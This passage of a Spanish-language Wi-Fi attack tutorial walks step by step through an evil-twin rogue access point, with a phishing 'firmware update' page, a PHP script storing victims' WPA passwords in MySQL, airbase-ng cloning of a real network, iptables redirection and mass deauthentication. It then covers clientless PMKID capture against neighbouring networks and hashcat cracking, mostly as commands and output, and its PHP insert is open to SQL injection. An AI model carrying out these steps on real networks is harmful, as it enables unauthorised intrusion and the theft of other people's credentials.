En este fichero, indicamos que el promedio de vida mÃ­nimo serÃ¡ de 600 segundos y el mÃ¡ximos de 7200. Entre
este rango, una vez pasado el tiempo estimado se asignarÃ¡ una nueva IP al cliente asociado a nuestro
AP (simplemente por hacerla dinÃ¡mica).

Para evitar entrar en conflicto con la topologÃ­a de mi red real, como la pasarela es la 192.168.1.1 y algunos de los equipos estÃ¡n configurados en el rango del 192.168.1.2 al 192.168.1.100, lo que he hecho ha sido asignar un nuevo segmento, comprendido entre el rango 192.168.1.130 hasta el 192.168.1.140. Asignaremos como mÃ¡scara de red la 255.255.255.128 y como nueva pasarela la 192.168.1.129. Todo esta configuraciÃ³n serÃ¡ gestionada por una nueva interfaz que crearemos en breve.

#### ConfiguraciÃ³n de pÃ¡gina web

Nos descargaremos la siguiente plantilla para hacer nuestro ataque: 

* http://ge.tt/9EyXb5w2

#### InicializaciÃ³n de servicios

Iniciamos los servicios **mysql** y **apache2**:

```bash
â”Œâ”€[root@parrot]â”€[/etc]
â””â”€â”€â•¼ #service apache2 start && service mysql start
â”Œâ”€[root@parrot]â”€[/etc]
â””â”€â”€â•¼ #echo $?
0
```

Posteriormente comprobamos que nuestro servidor web funciona correctamente:

<img align="center" src="https://funkyimg.com/i/2WbYt.png">

Todo este diseÃ±o es personalizable y se puede retocar sin ningÃºn tipo de problema desde el HTML. En mi caso,
lo voy a dejar asÃ­.

#### CreaciÃ³n de base de datos via MYSQL

Ahora bien, si nos fijamos en el **ACTION** del HTML principal, nos encontramos con esto:

```bash
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #cat index.html | grep action
            <tr><td><form action="dbconnect.php" method="post">
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #cat dbconnect.php 
<?php
session_start();
ob_start();
$host="localhost";
$username="fakeap";
$pass="fakeap";
$dbname="rogue_AP";
$tbl_name="wpa_keys";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}


$password1=$_POST['password1'];
$password2=$_POST['password2'];

$sql = "INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')";
if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

mysqli_close($conn);

sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>
```

El **action** viene definido por el fichero **dbconnect.php**, el cual si nos fijamos, lleva a cabo una
autenticaciÃ³n a travÃ©s del servicio **MYSQL** a una tabla y base de datos que no existen. Por tanto, hay que
crearla.

Crear la base de datos en este caso es bastante sencillo:

```bash
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #mysql -uroot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 10.1.37-MariaDB-3 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database rogue_AP;
Query OK, 1 row affected (0.00 sec)

MariaDB [(none)]> use rogue_AP;
Database changed
MariaDB [rogue_AP]> create table wpa_keys(password1 varchar(32), password2 varchar(32));
Query OK, 0 rows affected (0.40 sec)

MariaDB [rogue_AP]> show tables
    -> ;
+--------------------+
| Tables_in_rogue_AP |
+--------------------+
| wpa_keys           |
+--------------------+
1 row in set (0.00 sec)

MariaDB [rogue_AP]> describe wpa_keys;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| password1 | varchar(32) | YES  |     | NULL    |       |
| password2 | varchar(32) | YES  |     | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.00 sec)

MariaDB [rogue_AP]> 
```

Una vez creada, ya podemos insertar valores en ella:

```bash
MariaDB [rogue_AP]> insert into wpa_keys(password1, password2) values ("test", "test");
Query OK, 1 row affected (0.12 sec)

MariaDB [rogue_AP]> select *from wpa_keys;
+-----------+-----------+
| password1 | password2 |
+-----------+-----------+
| test      | test      |
+-----------+-----------+
1 row in set (0.00 sec)

MariaDB [rogue_AP]> 
```

Si probamos a introducir las credenciales desde la pÃ¡gina web, vemos que nos encontramos con el siguiente error:

`Connection failed: Access denied for user 'fakeap'@'localhost'`

Lo cual es normal, pues estÃ¡ intentando autenticar contra la base de datos haciendo uso del usuario
**fakeap**, el cual no estÃ¡ creado. Por tanto, lo creamos y asignamos mÃ¡ximos privilegios sobre la base de datos creada:

```bash
MariaDB [rogue_AP]> create user fakeap@localhost identified by 'fakeap';
Query OK, 0 rows affected (0.00 sec)

MariaDB [rogue_AP]> grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
Query OK, 0 rows affected (0.00 sec)
```

Y ahora ya tras introducir las credenciales desde la web, veremos que estas son aÃ±adidasq a nuestra base de
datos:

```bash
MariaDB [rogue_AP]> select *from wpa_keys;
+------------------+------------------+
| password1        | password2        |
+------------------+------------------+
| test             | test             |
| pruebadesdelaweb | pruebadesdelaweb |
+------------------+------------------+
2 rows in set (0.00 sec)

MariaDB [rogue_AP]> 
```

#### CreaciÃ³n de falso punto de acceso via Airbase

Comenzamos a montar nuestro Fake AP. Para ello, a travÃ©s de la utilidad **airbase**, generaremos un falso
punto de acceso en el canal especificado.

La idea en este punto, es analizar el entorno y listar los puntos de acceso disponibles. Aquel cuya contraseÃ±a
queramos averiguar, serÃ¡ el que clonaremos, generando un nuevo punto de acceso **OPN** con el mismo ESSID.

Supongamos que la red cuya contraseÃ±a quiero averiguar es **MOVISTAR_1677**, perfecto pues entonces hacemos lo
siguiente:

```bash
â”Œâ”€[root@parrot]â”€[/var/www/html]
â””â”€â”€â•¼ #airbase-ng -e MOVISTAR_1677 -c 7 -P wlan0mon
22:13:39  Created tap interface at0
22:13:39  Trying to set MTU on at0 to 1500
22:13:39  Access Point with BSSID E4:70:B8:D3:93:5C started.
```

Con esto, hemos conseguido crear un punto de acceso con nombre **MOVISTAR_1677** en el canal 7, sin
autenticaciÃ³n.

#### CreaciÃ³n de interfaz y asignaciÃ³n de segmentos

Ya con el punto de acceso creado, comenzamos creando una nueva interfaz **at0**, la cual en cuanto a
propiedades debe ser equivalente al fichero **dhcpd.conf** previamente creado:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #ifconfig at0 192.168.1.129 netmask 255.255.255.128
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #echo 1 > /proc/sys/net/ipv4/ip_forward
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #ifconfig
at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255
        inet6 fe80::e670:b8ff:fed3:935c  prefixlen 64  scopeid 0x20<link>
        ether e4:70:b8:d3:93:5c  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 57  bytes 8828 (8.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.43  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::c114:795c:5d1f:78a7  prefixlen 64  scopeid 0x20<link>
        ether 80:ce:62:3c:eb:a1  txqueuelen 1000  (Ethernet)
        RX packets 6777682  bytes 8286953540 (7.7 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3292154  bytes 880484597 (839.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 772442  bytes 1353509541 (1.2 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 772442  bytes 1353509541 (1.2 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=867<UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI>  mtu 1800
        unspec E4-70-B8-D3-93-5C-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 1179679  bytes 610643779 (582.3 MiB)
        RX errors 0  dropped 1078475  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #
```

Os recuerdo que el tercer comando aplicado es necesario para este caso, igual que cuando hacÃ­amos
envenenamiento ARP, pues para este caso necesitamos contar con el enrutamiento habilitado en nuestro equipo.

#### Control y creaciÃ³n de reglas de enrutamiento por iptables

A continuaciÃ³n, limpiamos cualquier tipo de regla que tengamos previamente definida de **iptables** y generamos nuestras nuevas reglas:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables --flush
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables --table nat --flush
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables --delete-chain
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables --table nat --delete-chain
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables --append FORWARD --in-interface at0 -j ACCEPT
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #iptables -t nat -A POSTROUTING -j MASQUERADE
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #
```

La idea es nutrir nuestra interfaz **at0** de la conexiÃ³n padre **eth0**, de esta forma, los usuarios que se
conecten a nuestro AP podrÃ¡n navegar por internet sin mayor inconveniente (en otras palabras, crear un tÃºnel
de conexiÃ³n).

Asimismo, cualquier trÃ¡fico **HTTP** que detectemos por parte de nuestras vÃ­ctimas, serÃ¡ redireccionado a
nuestra pÃ¡gina web fraudulenta, con el objetivo de hacerles creer que realmente el router necesita de una
configuraciÃ³n de Firmware y por ello solicita las credenciales de acceso a la red.

#### SincronizaciÃ³n de reglas definidas con el Fake AP

Ya por Ãºltimo, lo que nos queda es sincronizar todas nuestras reglas definidas con el Fake AP, para que cobre
vida y comience a operar bajo nuestras reglas:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
Internet Systems Consortium DHCP Server 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
Config file: /etc/dhcpd.conf
Database file: /var/lib/dhcp/dhcpd.leases
PID file: /var/run/dhcpd.pid
Wrote 2 leases to leases file.
Listening on LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
Sending on   LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
Sending on   Socket/fallback/fallback-net
```

Si obtenemos un output como el anterior, es que todo se ha realizado correctamente. Una vez llegados a este
punto, lo que procedemos desde otra consola es a aplicar un ataque de deautenticaciÃ³n global
(FF:FF:FF:FF:FF:FF) contra toda la red.

Tras los clientes lanzar paquetes **Probe Request** en busca del AP, como el legÃ­timo queda anulado debido a
los paquetes que estamos de manera continua enviando, los dispositivos se confundirÃ¡n y harÃ¡n que estos se
conecten a nuestro Fake AP, Â¿por quÃ© sin autenticarse?, porque nuestro Fake AP es de protocolo **OPN** :)

Esto del lado de la vÃ­ctima es casi inperceptible, pues la migraciÃ³n de una red a otra para algunos
dispositivos es casi inmediata. Ya dependiendo de la imaginaciÃ³n, originalidad e ingenio de cada uno, se podrÃ¡
obtener lo deseado una vez la vÃ­ctima se mueve por nuestros terrenos.

#### Robo de datos

Como es de esperar, una vez la vÃ­ctima navegue por una pÃ¡gina HTTP, serÃ¡ redireccionada a nuestro portal web
falso. A nivel de direcciÃ³n URL, figurarÃ¡ el dominio al cual ha accedido, es decir, no figurarÃ¡ nuestra
direcciÃ³n IP.

Una vez esta introduce sus credenciales, estas serÃ¡n enviadas a nuestra base de datos y a travÃ©s del servicio
**MYSQL** de forma interactiva las podremos visualizar sin mayor problema.

Otra forma mÃ¡s cÃ³moda en caso de no haber querido tirar de **MYSQL**, podrÃ­a haber sido para el **ACTION** del
HTML principal, haber definido un nuevo archivo **post.php** con una estructura semejante como esta:

```php
<?php $file = 'wifi-password.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://192.168.1.1" />
```

De manera que tras introducir las credenciales de acceso, estas son depositadas en nuestro equipo en la ruta
**/var/www/html**, en el fichero **wifi-password.txt**. De igual manera, en caso de introducir mÃºltiples
contraseÃ±as por parte de varios clientes, estas se van apilando, pudiendo ver todo el histÃ³rico de contraseÃ±as
introducidas.

### Ataque a redes sin clientes

Hasta ahora, hemos visto todas las tÃ©cnicas necesarias para averiguar la contraseÃ±a de una red Wifi que
funcione por protocolo WPA/WPA2 y autenticaciÃ³n PSK, pero siempre con la condiciÃ³n de que esta debe de poseer clientes.

Â¿QuÃ© pasa si la red no cuenta con clientes?, Â¿se puede averiguar la contraseÃ±a?, la respuesta es sÃ­, y no...
no es con un ataque de falsa autenticaciÃ³n.

#### Clientless PKMID Attack

Esta nueva metodologÃ­a nos permitirÃ¡ romper la seguridad de WPA y WPA2 mediante el denominado Pairwise Master
Key Identifier o PMKID, una caracterÃ­stica roaming habilitada en muchos dispositivos.

La principal diferencia con ataques existentes es que en este ataque, la captura de un EAPOL o saludo de
4-vÃ­as no es necesaria, como en casos anteriores. El nuevo ataque es realizado con el RSN IE (Robust Network
Information Element) de una simple trama EAPOL, lo cual es flipante y maravilloso.

##### Ataque desde Bettercap

Aunque no lo hago asÃ­, os lo explico tambiÃ©n. Imaginemos que queremos capturar los Hashes de mÃºltiples redes
inalÃ¡mbricas de nuestro entorno. OlvidÃ©monos ya de los Handshakes, y de ataques de de-autenticaciÃ³n y todas
estas tÃ©cnicas que habÃ­amos visto previamente.

Lo primero como siempre es ponerse en modo monitor, y desde **Bettercap** efectuar el siguiente procedimiento:

```bash
â”Œâ”€[root@parrot]â”€[/opt/bettercap]
â””â”€â”€â•¼ #./bettercap -iface wlan0mon
bettercap v2.24.1 (built for linux amd64 with go1.10.4) [type 'help' for a list of commands]

 wlan0mon  Â» wifi.recon on
[22:38:15] [sys.log] [inf] wifi using interface wlan0mon (e4:70:b8:d3:93:5c)
[22:38:16] [sys.log] [inf] wifi started (min rssi: -200 dBm)
 wlan0mon  Â» [22:38:16] [sys.log] [inf] wifi channel hopper started.
 wlan0mon  Â» [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_2A51 (-94 dBm) detected as 78:29:ed:a9:2a:52 (Askey Computer Corp).
 wlan0mon  Â» [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_A908 (-83 dBm) detected as fc:b4:e6:99:a9:09 (Askey Computer Corp).
 wlan0mon  Â» [22:38:18] [wifi.ap.new] wifi access point MOVISTAR_1677 (-55 dBm) detected as 1c:b0:44:d4:16:78 (Askey Computer Corp).
 wlan0mon  Â» [22:38:19] [wifi.ap.new] wifi access point MIWIFI_psGP (-95 dBm) detected as 50:78:b3:ee:bb:ac.
 wlan0mon  Â» [22:38:19] [wifi.client.new] new station 20:34:fb:b1:c5:53 detected for MOVISTAR_1677 (1c:b0:44:d4:16:78)
 wlan0mon  Â» w[22:38:20] [wifi.ap.new] wifi access point Wlan1 (-81 dBm) detected as f8:8e:85:df:3e:13 (Comtrend Corporation).
 wlan0mon  Â» wifi.[22:38:21] [wifi.ap.new] wifi access point devolo-30d32d583c6b (-81 dBm) detected as 30:d3:2d:58:3c:6b (devolo AG).
 wlan0mon  Â» wifi.[22:38:21] [wifi.ap.new] wifi access point LowiF7D3 (-90 dBm) detected as 10:62:d0:f6:f7:d8 (Technicolor CH USA Inc.).
 wlan0mon  Â» wifi.show[22:38:21] [wifi.ap.new] wifi access point vodafone4038 (-91 dBm) detected as 28:9e:fc:0c:40:3e (Sagemcom Broadband SAS).
 wlan0mon  Â» wifi.show[22:38:21] [wifi.ap.new] wifi access point MOVISTAR_3126 (-94 dBm) detected as cc:d4:a1:0c:31:28 (MitraStar Technology Corp.).
 wlan0mon  Â» wifi.show

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ RSSI â–´  â”‚       BSSID       â”‚        SSID         â”‚    Encryption    â”‚         WPS          â”‚ Ch â”‚ Clients â”‚ Sent  â”‚ Recvd â”‚   Seen   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ -57 dBm â”‚ 1c:b0:44:d4:16:78 â”‚ MOVISTAR_1677       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 6  â”‚ 1       â”‚ 486 B â”‚ 172 B â”‚ 22:38:19 â”‚
â”‚ -83 dBm â”‚ f8:8e:85:df:3e:13 â”‚ Wlan1               â”‚ WPA (TKIP, PSK)  â”‚ 1.0                  â”‚ 9  â”‚         â”‚       â”‚       â”‚ 22:38:20 â”‚
â”‚ -84 dBm â”‚ fc:b4:e6:99:a9:09 â”‚ MOVISTAR_A908       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 1  â”‚         â”‚       â”‚       â”‚ 22:38:17 â”‚
â”‚ -85 dBm â”‚ 30:d3:2d:58:3c:6b â”‚ devolo-30d32d583c6b â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 11 â”‚         â”‚       â”‚       â”‚ 22:38:22 â”‚
â”‚ -86 dBm â”‚ 10:62:d0:f6:f7:d8 â”‚ LowiF7D3            â”‚ WPA2 (TKIP, PSK) â”‚ 2.0                  â”‚ 11 â”‚         â”‚       â”‚       â”‚ 22:38:22 â”‚
â”‚ -92 dBm â”‚ 28:9e:fc:0c:40:3e â”‚ vodafone4038        â”‚ WPA2 (TKIP, PSK) â”‚ 2.0                  â”‚ 11 â”‚         â”‚       â”‚       â”‚ 22:38:21 â”‚
â”‚ -94 dBm â”‚ 50:78:b3:ee:bb:ac â”‚ MIWIFI_psGP         â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 6  â”‚         â”‚       â”‚       â”‚ 22:38:19 â”‚
â”‚ -94 dBm â”‚ 78:29:ed:a9:2a:52 â”‚ MOVISTAR_2A51       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 1  â”‚         â”‚       â”‚       â”‚ 22:38:16 â”‚
â”‚ -94 dBm â”‚ cc:d4:a1:0c:31:28 â”‚ MOVISTAR_3126       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0 (not configured) â”‚ 11 â”‚         â”‚       â”‚       â”‚ 22:38:21 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

wlan0mon (ch. 13) / â†‘ 0 B / â†“ 26 kB / 112 pkts

 wlan0mon  Â»  
```

Ya viendo que se nos listan todas las redes, corremos el siguiente comando:

```bash
 wlan0mon  Â» wifi.assoc all
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2A51 (channel:1 encryption:WPA2)
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_A908 (channel:1 encryption:WPA2)
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2F95 (channel:1 encryption:WPA2)
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP MIWIFI_psGP (channel:6 encryption:WPA2)
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:6 encryption:WPA2)
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP Wlan1 (channel:9 encryption:WPA)
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP vodafone4038 (channel:11 encryption:WPA2)
 wlan0mon  Â» [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_3126 (channel:11 encryption:WPA2)
 wlan0mon  Â» [22:39:19] [sys.log] [inf] wifi sending association request to AP LowiF7D3 (channel:11 encryption:WPA2)
 wlan0mon  Â» [22:39:19] [sys.log] [inf] wifi sending association request to AP devolo-30d32d583c6b (channel:11 encryption:WPA2)
 wlan0mon  Â» [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:112 encryption:WPA2)
 wlan0mon  Â» [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_PLUS_1677 (channel:112 encryption:WPA2)
 wlan0mon  Â» [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  Â» [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  Â» [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  Â» [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  Â» [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  Â» [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  Â»  
```

Sencillo, Â¿verdad?, pues ya estÃ¡, asÃ­ de fÃ¡cil. En el fichero **/root/bettercap-wifi-handshakes.pcap** ahora
lo Ãºnico que tenemos que pasar es la herramienta **hcxpcaptool** para convertir a Hashes nuestras capturas y
listo.

Prefiero comentar esta parte con mÃ¡s detalle en los siguientes puntos.

##### Ataque via hcxdumptool

Esta es la forma en la que yo lo suelo hacer. Ejecutamos el siguiente comando para capturar todos los PKMID's
posibles:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #hcxdumptool -i wlan0mon -o Captura --enable_status=1
initialization...
warning: NetworkManager is running with pid 27706
warning: wpa_supplicant is running with pid 27684
warning: wlan0mon is probably a monitor interface

start capturing (stop with ctrl+c)
INTERFACE................: wlan0mon
ERRORMAX.................: 100 errors
FILTERLIST...............: 0 entries
MAC CLIENT...............: b0febdab6d9d
MAC ACCESS POINT.........: 24336c5495c9 (incremented on every new client)
EAPOL TIMEOUT............: 150000
REPLAYCOUNT..............: 62752
ANONCE...................: 5e37baf7d8026ae9a9b5dcd74239558a74149218819377f2d3d866aa4c6249ab

[22:42:02 - 001] fcb4e699a909 -> b0febdab6d9d [FOUND PMKID CLIENT-LESS]
[22:42:08 - 006] 1cb044d41678 -> b0febdab6d9d [FOUND PMKID CLIENT-LESS]
INFO: cha=11, rx=1314, rx(dropped)=602, tx=117, powned=2, err=0
```

Y como vemos, en cuestiÃ³n de segundos tengo 2 redes vulnerables de las cuales he obtenido el PKMID. En este
punto, estarÃ­amos igual que con **Bettercap**, es decir, tenemos la captura, Â¿y ahora quÃ©?, descubrÃ¡moslo en el siguiente punto.

##### Uso de hcxpcaptool

Ahora viene la parte interesante, hemos visto lo sencillo que ha sido obtener un PKMID de 2 redes distintas.
Pues ahora tan solo tenemos que aplicar el siguiente comando para visualizar el hash correspondiente a la contraseÃ±a de la red inalÃ¡mbrica:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ls
Captura
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #hcxpcaptool -z myHashes Captura 

reading from Captura
                                                
summary:                                        
--------
file name........................: Captura
file type........................: pcapng 1.0
file hardware information........: x86_64
file os information..............: Linux 4.19.0-parrot1-13t-amd64
file application information.....: hcxdumptool 5.1.7
network type.....................: DLT_IEEE802_11_RADIO (127)
endianness.......................: little endian
read errors......................: flawless
packets inside...................: 30
skipped packets (damaged)........: 0
packets with GPS data............: 0
packets with FCS.................: 30
beacons (total)..................: 9
beacons (WPS info inside)........: 6
authentications (OPEN SYSTEM)....: 9
authentications (BROADCOM).......: 7
EAPOL packets (total)............: 12
EAPOL packets (WPA2).............: 12
PMKIDs (total)...................: 2
PMKIDs (WPA2)....................: 12
PMKIDs from access points........: 2
best PMKIDs......................: 2

2 PMKID(s) written to myHashes
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #cat myHashes 
0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038
2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
```

**ANOTACIÃ“N**: Para saber a quÃ© redes pertenecen estos Hashes, tan sÃ³lo tenemos que visualizar el valor
comprendido entre el primer y segundo asterisco. Corresponden a las BSSID's de los AP's.

Y estos, ya pueden ser pasados por **hashcat** para someterlos a la fase de Cracking:

```bash
â”Œâ”€[root@parrot]â”€[/usr/share/wordlists]
â””â”€â”€â•¼ #hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU

OpenCL Platform #2: The pocl project
====================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger set to 90c

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=16800 -D _unroll'
Dictionary cache hit:
